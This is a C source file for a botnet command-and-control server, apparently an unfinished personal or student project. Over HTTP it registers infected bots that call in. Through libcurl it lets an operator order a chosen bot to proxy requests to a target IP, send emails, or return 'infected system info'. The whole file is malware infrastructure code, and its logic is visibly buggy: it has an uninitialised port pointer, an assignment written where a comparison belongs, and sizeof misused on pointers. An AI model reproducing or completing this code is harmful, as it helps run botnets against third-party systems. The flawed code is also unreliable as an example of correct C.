
#include "common.h"
#define PAGE "<html><head><title>libmicrohttpd demo</title>" \
             "</head><body>libmicrohttpd demo</body></html>"

// BRAINSTORMING

/*
    p1 -> always on, get commands from cli and execute them
    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP

    p1 and p2 need to access a shared resource (active_bots):
    - p2 write on in -> producer
    - p1 read from it and update its contents -> consumer

    should I create a c1 process (child of p1)  or a p3 process
    that leaves a open UDP connection in order
    to update bots active state?

    active_bots -> Critical section
    botExists, list_botnet , sendCommand -> unsafe for now
*/

// BOT -> Critical section

active_bots *botnet = NULL; 
sem_t r, w;
int readcount, ret;
struct MHD_Daemon *mhd_daemon;

int botExists(int bot_id);
int list_botnet(int active);
void sendCommand(char *command, int bot_id);
int initializeSemaphores();
int closeSemaphores();
void parent(/*int pid*/);
void child();
void hello();
int registerBot(const char *bot_ip, const char *bot_port);
int findBot(struct in_addr, long port);
int setBotInfo(long *bot_port, char *bot_ip, int bot_id);
int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls);


void updateBotInfo(int bot_id, char *target_ip, char *command);


// ! ########################################################### MAIN ######################################################################################
int main(int argc, char const *argv[])
{

    int pid;

    initializeSemaphores();

    
    botnet = (active_bots *)malloc(sizeof(active_bots));
    if (botnet == NULL)
    {
        handle_error("Botnet could not be initialized");
    }
    botnet->next = NULL;
    botnet->bot_id = 0;
    

     pthread_t* threads = (pthread_t*)malloc(2 * sizeof(pthread_t));
        
        //parent
		if (pthread_create(&threads[0], NULL, parent,NULL) != 0) {
			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
			exit(EXIT_FAILURE);
		}
        //child
		if (pthread_create(&threads[1], NULL, child, NULL) != 0) {
			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
			exit(EXIT_FAILURE);
		}


        for (int i = 0; i < 2; i++){
		pthread_join(threads[i], NULL);

        }


    return 0;
}
// ! ########################################################### PARENT ######################################################################################
void parent(/*int pid*/)
{

    while (1)
    {

        char command[10];
        printf("\nInsert Command : ");
        fgets(command, 10, stdin);

        if (strcmp(command, LIST) == 0)
        {
            printf("Listing active bots of current botnet \n");

            list_botnet(1);
        }
        else if (strcmp(command, QUIT) == 0)
        {
            printf("Stop C&C \n");
            free(botnet);

            ret = closeSemaphores();
            if (ret < 0)
            {
                handle_error("Failed to close semaphores");
            }

            MHD_stop_daemon(mhd_daemon);

            // kill(pid, SIGKILL);

            exit(EXIT_SUCCESS);
        }
        else if (strcmp(command, "\n") == 0)
        {
        }
        // maybe just one or multiple | statements

        else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
        {
            printf("Choose bot to which send command \n");

            ret = list_botnet(0);

            if (ret < 0)
                continue;

            char bot_id[100];
            fgets(bot_id, 100, stdin);
            int bot = atoi(bot_id);

            if (botExists(bot) < 0)
            {
                printf("Not a valid bot id \n");
                continue;
            }
            else
            {
                sendCommand(command, bot);
            }
        }
        else
        {
            printf("Error, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s \n ",
                   HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);

            continue;
        }
    }
}
// ! ########################################################### CHILD ######################################################################################
void child()
{

    const union MHD_ConnectionInfo *conninfo;

    mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
    if (mhd_daemon == NULL)
    {
        fprintf(stderr, "Error starting daemon.\n");
        _exit(EXIT_FAILURE);
    }

    fprintf(stdout, "Child process started. Listening on port %d.\n", 8081);
    while (1)
    {
        sleep(1);
    }
}

void sendCommand(char *command, int bot_id)
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");
    else
    {

        CURLcode res;

        char *url;

        char bot_ip[INET_ADDRSTRLEN];
        char target_ip[INET_ADDRSTRLEN];
        long *bot_port;

        if (botExists(bot_id) < 0)
        {
            printf("Bot with id: %d does not exists\n", bot_id);
            return;
        }

        ret = setBotInfo(bot_port, bot_ip, bot_id);
        if (ret < 0)
        {
            printf("Could not set bot info");
            return;
        }

        printf("Submit target's ip in dot decimal notation: \n");
        fgets(target_ip, sizeof(target_ip), stdin);

        updateBotInfo(bot_id, target_ip, command);

        // * BUILDING REQUEST
        url = (char *)malloc(sizeof(target_ip) + sizeof(PROTOCOL));

        strcpy(url, PROTOCOL);
        strcat(url, target_ip);

        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);

        //! for each command you need to update bot info about action and target
        if (strcmp(command, HTTP_REQ) == 0)
        {
            char request[MAX_REQ_SIZE];

            printf("Insert request to proxy : ");
            scanf("%s", request);

            char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
            memcpy(new_url, url, sizeof(url));

            strcat(new_url, HTTP_REQ_ENDPOINT);

            strcat(new_url, request);

            printf("Sending request:  %s to bot...\n", new_url);
            free(new_url);
        }

        if (strcmp(command, EMAIL) == 0)
        {
            printf("Sending emails ");

            strcat(url, "/email");

            // TODO email batch
        }
        if (strcmp(command, SYS_INFO) == 0)
        {
            printf("Retrieving infected system info to: ");

            strcat(url, "/sys_info");

            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }

        free(url);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

/*
    active == true -> list active bots
    active == false -> list all registered bots
*/
int list_botnet(int active)
{

    int ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    if (botnet == NULL)
    {
        printf("Botnet is empty");
        return -1;
    }

    active_bots *bot = botnet;

    if (botnet == NULL)
    {
        printf("Botnet is empty \n");
        return -1;
    }

    char *target_ip = (char *)malloc(sizeof(INET_ADDRSTRLEN));
    char *bot_ip = (char *)malloc(sizeof(INET_ADDRSTRLEN));
    while (bot != NULL)
    {
        if (active == 1)
        {

            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, INET_ADDRSTRLEN);
            inet_ntop(AF_INET, &(bot->target_address), target_ip, INET_ADDRSTRLEN);

            printf("BOT_ID: %d - IP: %s - PORT: %ld - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->port, bot->action, target_ip);
        }
        else
        {
            printf("BOT_ID: %d \n", bot->bot_id);
        }

        bot = bot->next;
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    return 1;
}

int botExists(int bot_id)
{

    int ret = sem_wait(&r), res = -1;
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }

    if (botnet != NULL)
    {

        active_bots *bot = botnet;

        while (bot != NULL)
        {
            if (bot->bot_id == bot_id)
            {
                res = 1;
                break;
            }

            bot = bot->next;
        }
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    return res;
}

/*
 * Instanciate TCP connection in order to track current bots -> another fork?
 * use libcurl
 * email -> send array of email addresses, content
 * HTTP_REQ -> send http request as string "e.g curl ..."
 * SYS_INFO -> nothing
 */

int initializeSemaphores()
{

    int ret;

    ret = sem_init(&r, 1, 10);
    if (ret < 0)
        handle_error("Cannot init sem r");
    ret = sem_init(&w, 1, 1);
    if (ret < 0)
        handle_error("Cannot init sem w");
    return ret;
}
int closeSemaphores()
{

    int ret;

    ret = sem_destroy(&r);
    if (ret < 0)
        handle_error("Cannot close sem r");
    ret = sem_destroy(&w);
    if (ret < 0)
        handle_error("Cannot close sem w");

   

    return ret;
}

int registerBot(const char *bot_ip, const char *bot_port)
{

    int res = 1;

    int ret = sem_wait(&w);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }

    active_bots *bot = botnet;

    int id = 1;
    while (bot->next != NULL)
    {
        id += 1;
        bot = bot->next;
    }

    bot->next = (active_bots *)malloc(sizeof(active_bots));

    ret = inet_pton(AF_INET, bot_ip, &(bot->next->bot_address));
    if (ret == 0)
    {
        handle_error("Could not parse bot_ip to in_addr");
        res = -1;
    }

    bot->next->bot_id = id;
    bot->next->port = atol(bot_port);
    bot->next->next = NULL;

    ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    return res;
}

int findBot(struct in_addr address, long port)
{
    int res = -1;

    int ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (bot->bot_address.s_addr == address.s_addr && bot->port == port)
        {
            res = 1;
            break;
        }
        bot = bot->next;
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    return res;
}

int setBotInfo(long *bot_port, char *bot_ip, int bot_id)
{

    int res = -1;
    int ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (bot->bot_id == bot_id)
        {

            bot_port = &(bot->port);
            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, sizeof(bot->bot_address));

            res = 1;
            break;
        }
        bot = bot->next;
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem r");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem r");
    }

    return res;
}

void updateBotInfo(int bot_id, char *target_ip, char *command)
{

    int ret = sem_wait(&w);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (bot->bot_id = bot_id)
        {

            if (strcmp(target_ip, "") == 0)
            {
                inet_pton(AF_INET, "0.0.0.0", &(bot->target_address));
            }

            inet_pton(AF_INET, target_ip, &(bot->target_address));

            strcpy(bot->action, command);

            break;
        }
        bot = bot->next;
    }

    ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
}

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls)
{
    const char *msg = "OK";
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);

    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);

    long port = atol(bot_port);
    struct in_addr address;
    inet_pton(AF_INET, bot_ip, &(address));

    if (findBot(address, port) == -1)
    {

        ret = registerBot(bot_ip, bot_port);

        if (ret < 0)
        {
            const char *msg = "NOT OK";
        }
        printf("Bot Connected \n");
    }

    list_botnet(1);
    MHD_destroy_response(response);

    return ret;
}